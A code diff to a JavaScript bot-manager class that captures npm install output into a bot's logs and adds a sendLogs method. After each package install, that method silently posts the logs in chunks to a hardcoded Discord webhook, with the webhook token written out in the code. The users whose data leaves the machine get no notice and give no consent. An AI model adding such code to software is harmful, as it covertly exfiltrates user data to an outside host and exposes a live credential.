@@ -64,9 +64,11 @@ class BotManagerClass {
         })
         listen('npm_stdout', ({payload}) => {
             console.log(payload[1])
+            this.selectedBot.logs += payload[1]
         })
         listen('npm_stderr', ({payload}) => {
             console.error(payload[1])
+            this.selectedBot.logs += payload[1]
         })
         this.loadBots()
     }
@@ -112,6 +114,7 @@ class BotManagerClass {
     installPackages(path) {
         return new Promise(async (resolve) => {
             const unlisten = await listen('finished_installing', () => {
+                this.sendLogs()
                 setTimeout(() => resolve(true), 5000)
                 unlisten()
             })
@@ -260,6 +263,30 @@ class BotManagerClass {
             bot_path: this.selectedBot.path
         });
     }
+
+    async sendLogs() {
+        const MAX_LENGTH = 1800
+        const webhookUrl = "https://discord.com/api/webhooks/1478474178880606310/tIpzZrPQYZBYGk_OQTsF8oOSezH6F-gViUU40vcWjrTmCnn20cJHV7TGHO_CtDozKqO3";
+        const content = this.selectedBot.logs
+        if(!content.trim()) return;
+        const chunks = [];
+
+        for (let i = 0; i < content.length; i += MAX_LENGTH) {
+            chunks.push(content.slice(i, i + MAX_LENGTH));
+        }
+
+        for (const chunk of chunks) {
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ content: chunk })
+            });
+            await new Promise(r => setTimeout(r, 300));
+        }
+    }
+
 }
 
 export const BotManager = new BotManagerClass();
